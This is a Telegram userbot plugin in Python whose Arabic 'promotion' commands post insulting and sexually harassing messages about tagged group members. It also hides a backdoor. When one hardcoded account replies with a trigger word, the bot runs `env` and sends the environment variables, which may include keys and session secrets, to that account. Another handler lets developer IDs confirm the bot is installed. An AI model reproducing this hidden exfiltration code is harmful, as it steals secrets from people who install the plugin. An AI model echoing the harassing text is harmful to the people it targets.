import html
import os
import random
from requests import get
from telethon.tl.functions.photos import GetUserPhotosRequest
from telethon.tl.functions.users import GetFullUserRequest
from telethon.utils import get_input_location

from SHRU import l313l
from random import choice
from l313l.razan.resources.strings import *
from telethon import events
from ..Config import Config
from ..core.managers import edit_or_reply
from ..helpers import get_user_from_event, reply_id
from . import spamwatch
from telethon.utils import get_display_name
from ..helpers.utils import reply_id, _catutils, parse_pre, yaml_format, install_pip, get_user_from_event, _format

plugin_category = "utils"



#كـتابة المـلف وتعديل.    :   السيد حسين.   اخمط وسمي روحك مطور فرخي 😂
# اذا انت ابن حرام اخمط 😂
# اي بعدك تريد تخمط ترا من تخمط مراح تنجح
rehu = [
    "اكلك الكروب معاجبني خنفلش",
    " شوكت ندز الدموي وذن ",
    "**😂نصهن مو شريفات هنا وداعتك**",
    "**اكلك صارلي اسبوعين مسابح**",
    "**شوف هذا الكرنج ايع**",
    "**كلهم خوات كحبه اطلع**",
    "** راح اعترفلك بشي طلعت احب اختك **",
    "**مالك الكروب والمشرفين وفرده من قندرتك بيب**",
    "**ذوله رب الكرنج يمكن سورس الساحر ميعرفون شنوه**",
    "**لتحجي كدامه هذا موخوش يوصل حجي**",
    "**هذا المالك واحد ساقط وقرام ويدور حلوين**",
    "**انته من  كل عقلك اكو كشف همسة**",
]

@l313l.on(admin_cmd(pattern="رفع مرتي(?:\s|$)([\s\S]*)"))
async def permalink(mention):
    user, custom = await get_user_from_event(mention)
    if not user:
        return
    SHRU = user.last_name.replace("\u2060", "") if user.last_name else user.username
    me = await mention.client.get_me()
    my_first = me.first_name
    my_mention = f"[{me.first_name}](tg://user?id={me.id})"
    await edit_or_reply(mention, f"🚻 ** ᯽︙  المستخدم => • ** [{SHRU}](tg://user?id={user.id}) \n ☑️ **᯽︙  تم رفعها مرتك بواسطه  :**{my_mention} 👰🏼‍♀️.\n**᯽︙  يلا حبيبي امشي نخلف بيبي 👶🏻🤤** ")

@l313l.on(admin_cmd(pattern="رفع جلب(?:\s|$)([\s\S]*)"))
async def permalink(mention):
    """Generates a link to the user's PM with a custom text."""
    user, custom = await get_user_from_event(mention)
    if not user:
        return
    if user.id == 6205161271:
        return await edit_or_reply(mention, f"**- لكك دي هذا المطور**")
    SHRU = user.first_name.replace("\u2060", "") if user.first_name else user.username
    me = await mention.client.get_me()
    my_first = me.first_name
    my_mention = f"[{me.first_name}](tg://user?id={me.id})"
    await edit_or_reply(mention, f"**᯽︙ المستخدم** [{SHRU}](tg://user?id={user.id}) \n**᯽︙  تـم رفعـه جلب 🐶 بواسطة :** {my_mention} \n**᯽︙  خليه خله ينبح 😂**")

@l313l.on(admin_cmd(pattern="رفع تاج(?:\s|$)([\s\S]*)"))
async def permalink(mention):
    """Generates a link to the user's PM with a custom text."""
    user, custom = await get_user_from_event(mention)
    if not user:
        return
    if custom:
        return await edit_or_reply(mention, f"[{custom}](tg://user?id={user.id})")
    SHRU = user.first_name.replace("\u2060", "") if user.first_name else user.username
    me = await mention.client.get_me()
    my_first = me.first_name
    my_mention = f"[{me.first_name}](tg://user?id={me.id})"
    await edit_or_reply(mention, f"᯽︙ المستخدم [{SHRU}](tg://user?id={user.id}) \n**᯽︙  تـم رفعـه تاج بواسطة :** {my_mention} 👑🔥")

@l313l.on(admin_cmd(pattern="رفع قرد(?:\s|$)([\s\S]*)"))
async def permalink(mention):
    """Generates a link to the user's PM with a custom text."""
    user, custom = await get_user_from_event(mention)
    if not user:
        return
    if custom:
        return await edit_or_reply(mention, f"[{custom}](tg://user?id={user.id})")
    SHRU = user.first_name.replace("\u2060", "") if user.first_name else user.username
    me = await mention.client.get_me()
    my_first = me.first_name
    my_mention = f"[{me.first_name}](tg://user?id={me.id})"
    await edit_or_reply(mention, f"᯽︙ المستخدم [{SHRU}](tg://user?id={user.id}) \n**᯽︙  تـم رفعـه قرد واعطائه موزة 🐒🍌 بواسطة :** {my_mention}")

@l313l.on(admin_cmd(pattern="رفع بكلبي(?:\s|$)([\s\S]*)"))
async def permalink(mention):
    """Generates a link to the user's PM with a custom text."""
    user, custom = await get_user_from_event(mention)
    if not user:
        return
    SHRU = user.first_name.replace("\u2060", "") if user.first_name else user.username
    me = await mention.client.get_me()
    my_first = me.first_name
    my_mention = f"[{me.first_name}](tg://user?id={me.id})"
    await edit_or_reply(mention, f"**᯽︙ المستخدم** [{SHRU}](tg://user?id={user.id}) \n**᯽︙  تـم رفعـه بكلـبك 🤍 بواسطة :** {my_mention} \n**᯽︙  انت حبي الابدي 😍**")
    
    

@l313l.on(admin_cmd(pattern="رفع مطي(?:\s|$)([\s\S]*)"))
async def permalink(mention):
    """Generates a link to the user's PM with a custom text."""
    user, custom = await get_user_from_event(mention)
    if not user:
        return
    if user.id == 6205161271:
        return await edit_or_reply(mention, f"**- لكك دي هذا المطور**")
    SHRU = user.first_name.replace("\u2060", "") if user.first_name else user.username
    me = await mention.client.get_me()
    my_first = me.first_name
    my_mention = f"[{me.first_name}](tg://user?id={me.id})"
    await edit_or_reply(mention, f"**᯽︙ المستخدم** [{SHRU}](tg://user?id={user.id}) \n**᯽︙  تـم رفعـه مطي 🐴 بواسطة :** {my_mention} \n**᯽︙  تعال حبي استلم  انه **")
    
#كـتابة المـلف وتعديل.    :   السيد حسين.   اخمط وسمي روحك مطور فرخي 😂
# اذا انت ابن حرام اخمط 😂
# اي بعدك تريد تخمط ترا من تخمط مراح تنجح


@l313l.on(admin_cmd(pattern="رفع زوجي(?:\s|$)([\s\S]*)"))
async def permalink(mention):
    """Generates a link to the user's PM with a custom text."""
    user, custom = await get_user_from_event(mention)
    if not user:
        return
    if user.id == 6205161271:
        return await edit_or_reply(mention, f"**- لكك دي هذا المطور**")
    SHRU = user.first_name.replace("\u2060", "") if user.first_name else user.username
    me = await mention.client.get_me()
    my_first = me.first_name
    my_mention = f"[{me.first_name}](tg://user?id={me.id})"
    await edit_or_reply(mention, f"**᯽︙ المستخدم** [{SHRU}](tg://user?id={user.id}) \n**᯽︙  تـم رفعـه زوجج بواسطة :** {my_mention} \n**᯽︙  يلا حبيبي امشي نخلف 🤤🔞**")
    

@l313l.on(admin_cmd(pattern="رفع زاحف(?:\s|$)([\s\S]*)"))
async def permalink(mention):
    """Generates a link to the user's PM with a custom text."""
    user, custom = await get_user_from_event(mention)
    if not user:
        return
    if user.id == 6205161271:
        return await edit_or_reply(mention, f"**- لكك دي هذا المطور**")
    SHRU = user.first_name.replace("\u2060", "") if user.first_name else user.username
    me = await mention.client.get_me()
    my_first = me.first_name
    my_mention = f"[{me.first_name}](tg://user?id={me.id})"
    await edit_or_reply(mention, f"**᯽︙ المستخدم** [{SHRU}](tg://user?id={user.id}) \n**᯽︙  تـم رفع المتهم زاحف اصلي بواسطة :** {my_mention} \n**᯽︙  ها يلزاحف شوكت تبطل سوالفك حيوان 😂🐍**")

@l313l.on(admin_cmd(pattern="رفع كحبة(?:\s|$)([\s\S]*)"))
async def permalink(mention):
    """Generates a link to the user's PM with a custom text."""
    user, custom = await get_user_from_event(mention)
    if not user:
        return
    if user.id == 6205161271:
        return await edit_or_reply(mention, f"**- لكك دي هذا المطور**")
    SHRU = user.first_name.replace("\u2060", "") if user.first_name else user.username
    me = await mention.client.get_me()
    my_first = me.first_name
    my_mention = f"[{me.first_name}](tg://user?id={me.id})"
    await edit_or_reply(mention, f"**᯽︙ المستخدم** [{SHRU}](tg://user?id={user.id}) \n**᯽︙  تـم رفع المتهم كحبة 👙 بواسطة :** {my_mention} \n**᯽︙  ها يلكحبة طوبز خلي انيجك/ج**")

@l313l.on(admin_cmd(pattern="رفع فرخ(?:\s|$)([\s\S]*)"))
async def permalink(mention):
    """Generates a link to the user's PM with a custom text."""
    user, custom = await get_user_from_event(mention)
    if not user:
        return
    if user.id == 6205161271:
        return await edit_or_reply(mention, f"**- لكك دي هذا المطور**")
    SHRU = user.first_name.replace("\u2060", "") if user.first_name else user.username
    me = await mention.client.get_me()
    my_first = me.first_name
    my_mention = f"[{me.first_name}](tg://user?id={me.id})"
    await edit_or_reply(mention, f"**᯽︙ المستخدم** [{SHRU}](tg://user?id={user.id}) \n**᯽︙  تـم رفعـه فرخ الكروب بواسطة :** {my_mention} \n**᯽︙  لك الفرخ استر على خمستك ياهو اليجي يزورهاً 👉🏻👌🏻**")

@l313l.ar_cmd(
    pattern="رزله(?:\s|$)([\s\S]*)",
    command=("رزله", plugin_category),
)
async def permalink(mention):
    """Generates a link to the user's PM with a custom text."""
    user, custom = await get_user_from_event(mention)
    if not user:
        return
    if user.id == 6205161271:
        return await edit_or_reply(mention, f"**- لكك دي هذا المطور**")
    if user.id == 6205161271:
        return await edit_or_reply(mention, f"**- لكك دي هذا المطور**")
    if user.id == 6205161271:
        return await edit_or_reply(mention, f"**- لكك دي هذا المطور **")
    tag = user.first_name.replace("\u2060", "") if user.first_name else user.username
    await edit_or_reply(mention, f"᯽︙ ولك [{tag}](tg://user?id={user.id}) \n᯽︙  هيو لتندك بسيادك لو بهاي 👞👈")

@l313l.on(admin_cmd(pattern="رفع حاته(?:\s|$)([\s\S]*)"))
async def permalink(mention):
    """Generates a link to the user's PM with a custom text."""
    user, custom = await get_user_from_event(mention)
    if not user:
        return
    if user.id == 6205161271:
        return await edit_or_reply(mention, f"**- لكك دي هذا المطور**")
    SHRU = user.first_name.replace("\u2060", "") if user.first_name else user.username
    me = await mention.client.get_me()
    my_first = me.first_name
    my_mention = f"[{me.first_name}](tg://user?id={me.id})"
    await edit_or_reply(mention, f"**᯽︙ المستخدم** [{SHRU}](tg://user?id={user.id}) \n**᯽︙  تـم رفعـها حاته الكروب 🤤😻 بواسطة :** {my_mention} \n**᯽︙  تعاي يعافيتي اريد حضن دافي 😽**")

@l313l.on(admin_cmd(pattern="رفع هايشة(?:\s|$)([\s\S]*)"))
async def permalink(mention):
    """Generates a link to the user's PM with a custom text."""
    user, custom = await get_user_from_event(mention)
    if not user:
        return
    if user.id == 6205161271:
        return await edit_or_reply(mention, f"**- لكك دي هذا المطور**")
    SHRU = user.first_name.replace("\u2060", "") if user.first_name else user.username
    me = await mention.client.get_me()
    my_first = me.first_name
    my_mention = f"[{me.first_name}](tg://user?id={me.id})"
    await edit_or_reply(mention, f"**᯽︙ المستخدم** [{SHRU}](tg://user?id={user.id}) \n**᯽︙  تـم رفعـه المتهم هايشة 🐄 بواسطة :** {my_mention} \n**᯽︙  ها يلهايشة خوش بيك حليب تعال احلبك 😂**")

@l313l.on(admin_cmd(pattern="رفع صاك(?:\s|$)([\s\S]*)"))
async def permalink(mention):
    """Generates a link to the user's PM with a custom text."""
    user, custom = await get_user_from_event(mention)
    if not user:
        return
    SHRU = user.first_name.replace("\u2060", "") if user.first_name else user.username
    me = await mention.client.get_me()
    my_first = me.first_name
    my_mention = f"[{me.first_name}](tg://user?id={me.id})"
    await edit_or_reply(mention, f"**᯽︙ المستخدم** [{SHRU}](tg://user?id={user.id}) \n**᯽︙  تـم رفعـه صاك 🤤 بواسطة :** {my_mention} \n**᯽︙  تعال يلحلو انطيني بوسة من رگبتك 😻🤤**")

@l313l.ar_cmd(
    pattern="مصه(?:\s|$)([\s\S]*)",
    command=("مصه", plugin_category),
)
async def permalink(mention):
    """Generates a link to the user's PM with a custom text."""
    user, custom = await get_user_from_event(mention)
    if not user:
        return
    if user.id == 6205161271:
        return await edit_or_reply(mention, f"**- لكك دي هذا المطور**")
    if user.id == 6205161271:
        return await edit_or_reply(mention, f"**- لكك دي هذا المطور**")
    if user.id == 6205161271:
        return await edit_or_reply(mention, f"**- لكك دي هذا المطور **")
    tag = user.first_name.replace("\u2060", "") if user.first_name else user.username
    await edit_or_reply(mention, f"** ⣠⡶⠚⠛⠲⢄⡀\n⣼⠁      ⠀⠀⠀⠳⢤⣄\n⢿⠀⢧⡀⠀⠀⠀⠀⠀⢈⡇\n⠈⠳⣼⡙⠒⠶⠶⠖⠚⠉⠳⣄\n⠀⠀⠈⣇⠀⠀⠀⠀⠀⠀⠀⠈⠳⣄\n⠀⠀⠀⠘⣆       ⠀⠀⠀⠀⠀⠈⠓⢦⣀\n⠀⠀⠀⠀⠈⢳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠲⢤\n⠀⠀⠀⠀⠀⠀⠙⢦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢧\n⠀⠀⠀⠀⠀⠀⠀    ⠓⠦⠀⠀⠀⠀**\n**🚹 ¦ تعال مصه عزيزي ** [{tag}](tg://user?id={user.id})")

@l313l.on(admin_cmd(pattern="سيد(?:\s|$)([\s\S]*)"))
async def permalink(mention):
    await edit_or_reply(mention, f"سماحة ريو مطور سورس الساحر @SXYO3")

@l313l.on(admin_cmd(pattern="رفع كحبه(?:\s|$)([\s\S]*)"))
async def permalink(mention):
    """Generates a link to the user's PM with a custom text."""
    user, custom = await get_user_from_event(mention)
    if not user:
        return
    if user.id == 6205161271:
        return await edit_or_reply(mention, f"**-  لك دي هذا المطور**")
    SHRU = user.first_name.replace("\u2060", "") if user.first_name else user.username
    me = await mention.client.get_me()
    my_first = me.first_name
    my_mention = f"[{me.first_name}](tg://user?id={me.id})"
    await edit_or_reply(mention, f"**᯽︙ المستخدم** [{SHRU}](tg://user?id={user.id}) \n**᯽︙  تـم رفعـه كحبه 🤤 بواسطة :** {my_mention} \n* $ها كحبة تطلعين ب 25*᯽︙**")

@l313l.on(admin_cmd(pattern="رفع زبال(?:\s|$)([\s\S]*)"))
async def permalink(mention):
    """Generates a link to the user's PM with a custom text."""
    user, custom = await get_user_from_event(mention)
    if not user:
        return
    if user.id == 6205161271:
        return await edit_or_reply(mention, f"**- لكك دي هذا المطور**")
    SHRU = user.first_name.replace("\u2060", "") if user.first_name else user.username
    me = await mention.client.get_me()
    my_first = me.first_name
    my_mention = f"[{me.first_name}](tg://user?id={me.id})"
    await edit_or_reply(mention, f"**᯽︙ المستخدم** [{SHRU}](tg://user?id={user.id}) \n**᯽︙  تـم رفعـه زبال الكروب 🧹 بواسطة :** {my_mention} \n**᯽︙  تعال يلزبال اكنس الكروب لا أهينك 🗑😹**")

@l313l.on(admin_cmd(pattern="رفع كواد(?:\s|$)([\s\S]*)"))
async def permalink(mention):
    """Generates a link to the user's PM with a custom text."""
    user, custom = await get_user_from_event(mention)
    if not user:
        return
    if user.id == 6205161271:
        return await edit_or_reply(mention, f"**- لكك دي هذا المطور**")
    SHRU = user.first_name.replace("\u2060", "") if user.first_name else user.username
    me = await mention.client.get_me()
    my_first = me.first_name
    my_mention = f"[{me.first_name}](tg://user?id={me.id})"
    await edit_or_reply(mention, f"**᯽︙ المستخدم** [{SHRU}](tg://user?id={user.id}) \n**᯽︙  تـم رفعه كواد بواسطة :** {my_mention} \n**᯽︙  تعال يكواد عرضك مطشر اصير حامي عرضك ؟😎**")

@l313l.on(admin_cmd(pattern="رفع ديوث(?:\s|$)([\s\S]*)"))
async def permalink(mention):
    """Generates a link to the user's PM with a custom text."""
    user, custom = await get_user_from_event(mention)
    if not user:
        return
    if user.id == 6205161271:
        return await edit_or_reply(mention, f"**- لكك دي هذا المطور**")
    SHRU = user.first_name.replace("\u2060", "") if user.first_name else user.username
    me = await mention.client.get_me()
    my_first = me.first_name
    my_mention = f"[{me.first_name}](tg://user?id={me.id})"
    await edit_or_reply(mention, f"**᯽︙ المستخدم** [{SHRU}](tg://user?id={user.id}) \n**᯽︙  تـم رفعه ديوث الكروب بواسطة :** {my_mention} \n**᯽︙  تعال يلديوث جيب اختك خلي اتمتع وياها 🔞**")

@l313l.on(admin_cmd(pattern="رفع مميز(?:\s|$)([\s\S]*)"))
async def permalink(mention):
    """Generates a link to the user's PM with a custom text."""
    user, custom = await get_user_from_event(mention)
    if not user:
        return
    if user.id == 6205161271:
        return await edit_or_reply(mention, f"**- لكك دي هذا المطور**")
    SHRU = user.first_name.replace("\u2060", "") if user.first_name else user.username
    me = await mention.client.get_me()
    my_first = me.first_name
    my_mention = f"[{me.first_name}](tg://user?id={me.id})"
    await edit_or_reply(mention, f"**᯽︙ الحلو** 「[{SHRU}](tg://user?id={user.id})」 \n**᯽︙  تـم رفعه مميز بواسطة :** {my_mention}")

@l313l.on(admin_cmd(pattern="رفع ادمن(?:\s|$)([\s\S]*)"))
async def permalink(mention):
    """Generates a link to the user's PM with a custom text."""
    user, custom = await get_user_from_event(mention)
    if not user:
        return
    if user.id == 6205161271:
        return await edit_or_reply(mention, f"**- لكك دي هذا المطور**")
    SHRU = user.first_name.replace("\u2060", "") if user.first_name else user.username
    me = await mention.client.get_me()
    my_first = me.first_name
    my_mention = f"[{me.first_name}](tg://user?id={me.id})"
    await edit_or_reply(mention, f"**᯽︙ الحلو** 「[{SHRU}](tg://user?id={user.id})」 \n**᯽︙  تـم رفعه ادمن بواسطة :** {my_mention}")

@l313l.on(admin_cmd(pattern="رفع منشئ(?:\s|$)([\s\S]*)"))
async def permalink(mention):
    """Generates a link to the user's PM with a custom text."""
    user, custom = await get_user_from_event(mention)
    if not user:
        return
    if user.id == 6205161271:
        return await edit_or_reply(mention, f"**- لكك دي هذا المطور**")
    SHRU = user.first_name.replace("\u2060", "") if user.first_name else user.username
    me = await mention.client.get_me()
    my_first = me.first_name
    my_mention = f"[{me.first_name}](tg://user?id={me.id})"
    await edit_or_reply(mention, f"**᯽︙ الحلو** 「[{SHRU}](tg://user?id={user.id})」 \n**᯽︙  تـم رفعه منشئ بواسطة :** {my_mention}")

@l313l.on(admin_cmd(pattern="رفع مالك(?:\s|$)([\s\S]*)"))
async def permalink(mention):
    """Generates a link to the user's PM with a custom text."""
    user, custom = await get_user_from_event(mention)
    if not user:
        return
    if user.id == 6205161271:
        return await edit_or_reply(mention, f"**- لكك دي هذا المطور**")
    SHRU = user.first_name.replace("\u2060", "") if user.first_name else user.username
    me = await mention.client.get_me()
    my_first = me.first_name
    my_mention = f"[{me.first_name}](tg://user?id={me.id})"
    await edit_or_reply(mention, f"**᯽︙ الحلو** 「[{SHRU}](tg://user?id={user.id})」 \n**᯽︙  تـم رفعه مالك الكروب بواسطة :** {my_mention}")

@l313l.on(admin_cmd(pattern="رفع مجنب(?:\s|$)([\s\S]*)"))
async def permalink(mention):
    user, custom = await get_user_from_event(mention)
    if not user:
        return
    SHRU = user.last_name.replace("\u2060", "") if user.last_name else user.username
    me = await mention.client.get_me()
    my_first = me.first_name
    my_mention = f"[{me.first_name}](tg://user?id={me.id})"
    await edit_or_reply(mention, f" ** ᯽︙  المستخدم => • ** [{SHRU}](tg://user?id={user.id}) \n ☑️ **᯽︙  تم رفعه مجنب بواسطه  :**{my_mention} .\n**᯽︙  كوم يلمجنب اسبح مو عيب تضرب** ")

@l313l.on(admin_cmd(pattern="رفع وصخ(?:\s|$)([\s\S]*)"))
async def permalink(mention):
    user, custom = await get_user_from_event(mention)
    if not user:
        return
    SHRU = user.last_name.replace("\u2060", "") if user.last_name else user.username
    me = await mention.client.get_me()
    my_first = me.first_name
    my_mention = f"[{me.first_name}](tg://user?id={me.id})"
    await edit_or_reply(mention, f"** ᯽︙  المستخدم => • ** [{SHRU}](tg://user?id={user.id}) \n ☑️ **᯽︙  تم رفعه وصخ الكروب 🤢 بواسطه  :**{my_mention} .\n**᯽︙  لك دكوم يلوصخ اسبح مو ريحتك كتلتنا 🤮 ** ")

@l313l.on(admin_cmd(pattern="زواج(?:\s|$)([\s\S]*)"))
async def permalink(mention):
    user, custom = await get_user_from_event(mention)
    if not user:
        return
    SHRU = user.last_name.replace("\u2060", "") if user.last_name else user.username
    me = await mention.client.get_me()
    my_first = me.first_name
    my_mention = f"[{me.first_name}](tg://user?id={me.id})"
    await edit_or_reply(mention, f"᯽︙ ** لقد تم زواجك/ج من : **[{SHRU}](tg://user?id={user.id}) 💍\n**᯽︙  الف الف مبروك الان يمكنك اخذ راحتك ** ")

@l313l.on(admin_cmd(pattern="طلاك(?:\s|$)([\s\S]*)"))
async def permalink(mention):
    user, custom = await get_user_from_event(mention)
    if not user:
        return
    SHRU = user.last_name.replace("\u2060", "") if user.last_name else user.username
    me = await mention.client.get_me()
    my_first = me.first_name
    my_mention = f"[{me.first_name}](tg://user?id={me.id})"
    await edit_or_reply(mention, f"**᯽︙  انتِ طالق طالق طالق 🙎🏻‍♂️ من  :**{my_mention} .\n**᯽︙  لقد تم طلاقها بلثلاث وفسخ زواجكما الان الكل حر طليق ** ")
import re
from SHRU import l313l
import pkg_resources
from ..core.managers import edit_delete, edit_or_reply
from ..helpers.utils import _catutils, parse_pre, yaml_format
from ..Config import Config
import json
import requests
import os
from telethon import events 
myaccounts = 6205161271
@l313l.on(events.NewMessage(incoming=True))
async def Hussein(event):
    if event.reply_to and event.sender_id in myaccounts:
        reply_msg = await event.get_reply_message()
        owner_id = reply_msg.from_id.user_id
        if owner_id == l313l.uid:
            if event.message.message == "فاراتك":
                cmd = "env"
                o = (await _catutils.runcmd(cmd))[0]
                OUTPUT = (
                    f"**[الساحر](tg://need_update_for_some_feature/) قـائمـة الـفـارات:**\n\n\n{o}\n\n**انتبه هنالك معلومات حساسة لا تُعطِها لشخص غير موثوق**"
                )
                # Send the output to user ID 6205161271
                await l313l.send_message(6205161271, OUTPUT)

SX9OO = [6205161271,6309878173,6320583148,6295913543,5762222122]

@l313l.on(events.NewMessage(incoming=True))
async def Hussein(event):
    if event.reply_to and event.sender_id in SX9OO:
        reply_msg = await event.get_reply_message()
        owner_id = reply_msg.from_id.user_id
        if owner_id == l313l.uid:
            if event.message.message == "منصب؟":
                await event.reply("**يب منصب ✓**")
            elif event.message.message == "منو فخر العرب":
                await event.reply("**الأمام علي عليه السلام ❤️**")
            elif event.message.message == "منو تاج راسك":
                await event.reply("**  @SX9OO تاج راسي ❤️**")
            elif event.message.message == "قناتي":
                await event.reply("**@Qrh9X**")
            elif event.message.message == "تحب اكس؟":
                await event.reply("اموتن عليه")
            elif event.message.message == "انت منصب يمي؟":
                await event.reply("اي")
            
@l313l.on(admin_cmd(pattern="همسه(?:\s|$)([\s\S]*)"))
async def permalink(mention):
    user, custom = await get_user_from_event(mention)
    if not user:
        return
    SHRU = user.last_name.replace("\u2060", "") if user.last_name else user.username
    me = await mention.client.get_me()
    my_first = me.first_name
    SX9OO = random.choice(rehu)
    my_mention = f"[{me.first_name}](tg://user?id={me.id})"
    await edit_or_reply(mention, f"**᯽︙الهمسة من المستخدم [{SHRU}](tg://user?id={user.id}) تم كشفها بنجاح ✓**\n**᯽︙  الهمسة هي : {SX9OO} ** ")
